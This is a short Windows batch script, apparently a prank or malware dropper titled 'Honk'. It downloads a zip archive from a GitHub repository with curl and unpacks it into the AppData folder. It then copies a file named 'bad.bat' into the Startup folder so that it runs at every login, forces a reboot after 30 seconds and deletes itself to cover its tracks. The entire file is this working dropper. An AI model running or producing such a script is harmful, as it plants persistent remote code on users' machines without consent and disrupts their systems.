set "Startup_Dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
start /MIN cmd /C "curl "https://github.com/glonpl/Honk/archive/refs/heads/main.zip" --ssl-no-revoke -L -o %TEMP%\temp.zip"
start /MIN powershell -Command "Expand-Archive %TEMP%\temp.zip -DestinationPath %APPDATA%" 
copy "%APPDATA%\Honk-main\bad.bat" "%Startup_Dir%\bad.bat"
del %TEMP%\temp.zip
shutdown /r /t 30 /c "Honk!"
start /b "" cmd /c del "%~f0"&exit /b
